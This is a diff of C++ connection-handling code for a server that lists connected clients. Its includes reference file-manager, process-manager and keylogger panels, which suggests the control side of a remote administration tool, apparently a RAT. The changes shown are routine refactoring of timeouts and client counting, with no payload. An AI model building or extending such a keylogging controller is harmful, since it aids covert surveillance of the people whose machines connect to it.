@@ -1,6 +1,7 @@
 #include "server.hpp"
 #include "misc.hpp"
 #include "frame_client.hpp"
+#include "frame_main.hpp"
 #include "panel_file_manager.hpp"
 #include "panel_process_manager.hpp"
 #include "panel_keylogger.hpp"
@@ -550,7 +551,7 @@ ClientConInfo Servidor::m_Aceptar(){
         
         this->m_txtLog->LogThis(strTmp, LogType::LogMessage);
 
-        DWORD timeout = 1 * 1000;
+        DWORD timeout = CLI_TIMEOUT_SECS * 1000;
         setsockopt(tmpSck, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof timeout);
         
         structNuevo._strPuerto = std::to_string(ntohs(structCliente.sin_port));
@@ -605,7 +606,6 @@ void Servidor::m_CerrarConexiones() {
     }
     
     m_CerrarConexion(this->sckSocket);
-    this->iCount = 0;
 }
 
 void Servidor::m_CleanVector() {
@@ -632,12 +632,6 @@ void Servidor::m_CleanVector() {
 
                 this->m_BorrarCliente(vector_mutex, iIndex);
 
-                {
-                    std::unique_lock<std::mutex> lock2(this->count_mutex);
-                    if (this->iCount > 0) {
-                        this->iCount--;
-                    }
-                }
             }else if (!this->m_Running()) {
                 //Cerra el loop y no iterar por todos si ya no esta escuchando
                 break;
@@ -773,7 +767,6 @@ void Servidor::m_Escucha(){
         fd_set fdMaster_copy = fdMaster;
         
         int iNumeroSockets = select(this->sckSocket + 1, &fdMaster_copy, nullptr, nullptr, &timeout);
-        
         for (int iCont = 0; iCont < iNumeroSockets; iCont++) {
             SOCKET iSock = fdMaster_copy.fd_array[iCont];
 
@@ -830,13 +823,6 @@ int Servidor::IndexOf(std::string strID) {
 
 void Servidor::m_InsertarCliente(struct Cliente& p_Cliente){
     int iIndex = this->m_listCtrl->GetItemCount();
-    //std::unique_lock<std::mutex> lock(this->count_mutex);
-    //iIndex = this->iCount++;
-    //lock.unlock();
-
-    //if (iIndex > this->m_listCtrl->GetItemCount()) {
-    //    iIndex = 0;
-    //}
 
     this->m_listCtrl->InsertItem(iIndex, wxString(p_Cliente._id));
     this->m_listCtrl->SetItem(iIndex, 1, wxString(p_Cliente._strUser));
